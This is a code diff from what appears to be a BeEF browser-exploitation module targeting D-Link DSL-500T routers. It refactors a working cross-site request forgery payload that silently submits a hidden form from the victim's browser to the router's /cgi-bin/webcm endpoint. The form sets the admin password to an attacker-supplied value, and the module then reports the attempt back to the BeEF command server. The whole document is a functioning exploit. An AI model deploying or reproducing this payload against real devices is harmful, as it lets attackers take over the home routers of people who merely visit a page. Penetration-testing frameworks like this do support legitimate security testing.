@@ -17,48 +17,13 @@ beef.execute(function() {
   var gateway = '<%= @base %>'; 
   var passwd = '<%= @password %>';
 
-  var target = gateway + "/cgi-bin/webcm";
-
-  var dsl500t_iframe = beef.dom.createInvisibleIframe();
-
-  var form = document.createElement('form');
-  form.setAttribute('action', target);
-  form.setAttribute('method', 'post');
-
-  var input = null;
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'getpage');
-  input.setAttribute('value', '../html/tools/usrmgmt.htm');
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'security:settings/username');
-  input.setAttribute('value', 'admin');
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'security:settings/password');
-  input.setAttribute('value', passwd);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'security:settings/password_confirm');
-  input.setAttribute('value', passwd);
-  form.appendChild(input);
-
-  input = document.createElement('input');
-  input.setAttribute('type', 'hidden');
-  input.setAttribute('name', 'security:settings/idle_timeout');
-  input.setAttribute('value', '30');
-  form.appendChild(input);
-
-  dsl500t_iframe.contentWindow.document.body.appendChild(form);
-  form.submit();
+  var dsl500t_iframe = beef.dom.createIframeXsrfForm(gateway + "/cgi-bin/webcm", "POST",
+      [{'type':'hidden', 'name':'getpage', 'value':'../html/tools/usrmgmt.htm'} ,
+       {'type':'hidden', 'name':'security:settings/username', 'value':'admin'},
+       {'type':'hidden', 'name':'security:settings/password', 'value':passwd},
+       {'type':'hidden', 'name':'security:settings/password_confirm', 'value':passwd},
+       {'type':'hidden', 'name':'security:settings/idle_timeout', 'value':'30'}
+      ]);
 
   beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
 
